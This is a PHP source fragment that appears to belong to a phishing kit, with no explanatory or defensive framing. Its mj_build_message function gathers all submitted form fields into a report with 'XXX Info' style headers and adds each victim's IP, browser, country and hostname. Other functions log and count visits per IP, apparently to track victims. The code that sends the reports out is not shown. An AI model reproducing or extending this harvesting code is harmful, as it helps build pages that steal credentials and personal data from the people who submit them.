function mj_build_message($post_array)
{
    global $ip, $svr_host,$grab_all_fields,$allowed_fields;
    $country = mj_get_country_name($ip);
    $timedate = date("D/M/d, Y g:i a"); 
    $browserAgent = $_SERVER['HTTP_USER_AGENT'];
    $hostname = gethostbyaddr($ip); 
    $message = "-------------- XXX Info -----------------------\n";
    if($grab_all_fields)
    {
        foreach($post_array as $k=>$v)
        {
            //grab all fields
            $message .= ucfirst($k)." : ".$v."\n";
        }
    }
    else
    {
        foreach($post_array as $k=>$v)
        {
            //grab selected fields only.
            if(in_array($k, $allowed_fields))
            {
                $message .= ucfirst($k)." : ".$v."\n";
            }
        }
    }
    $message .= "-------------Mor3 Info-----------------------\n";
    $message .= "IP               : ".$ip."\n";
    $message .= "Browser          : ".$browserAgent."\n";
    $message .= "DateTime         : ".$timedate."\n";
    $message .= "country          : ".$country."\n";
    $message .= "HostName         : ".$hostname."\n";
    $message .= "--------------- XXX-MJ -------------\n";
    
    return $message;
}



function mj_get_ip()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    }
    elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    }
    else {
        $ip = $remote;
    }

    return $ip;
}

function mj_get_visit_log_data()
{
    global $visit_log_file;

    $visit_log_data = [];

    $chk_handle = fopen($visit_log_file, "a+");
    $chk_data = '';
    if(filesize($visit_log_file) > 0)
    {
        $chk_data = fread($chk_handle, filesize($visit_log_file));
    }
    fclose($chk_handle);

    if(!empty($chk_data))
    {
        // Seperate each logline
        $log = explode("\n", trim($chk_data)); 

        // Seperate each part in each logline
        for ($i = 0; $i < count($log); $i++) {
            $log[$i] = trim($log[$i]);
            $log[$i] = explode('|', $log[$i]);
        }

        $visit_log_data = $log;
    }
    
    return $visit_log_data; 
}


function mj_count_visits($p_arr, $p_ip)
{
    // Verify visit counts

    $visit_count   = 0;

    if(is_array($p_arr) && !empty($p_arr))
    {
        foreach($p_arr as $a_vist_data)
        {
            if(in_array($p_ip, $a_vist_data)){
                $visit_count++;
            }
        }
    }

    return $visit_count; 
}

function mj_count_visit_2()
{
    $p_arr = mj_get_visit_log_data();

    // Verify visit counts
    $visit_count = 0;
    $ips = [];

    if(is_array($p_arr) && !empty($p_arr))
    {
        foreach($p_arr as $a_vist_data)
        {
            if(!in_array($a_vist_data[0], $ips))
            {
                $visit_count++;

                $ips[] = $a_vist_data[0];
            }
        }
    }

    return $visit_count; 
}


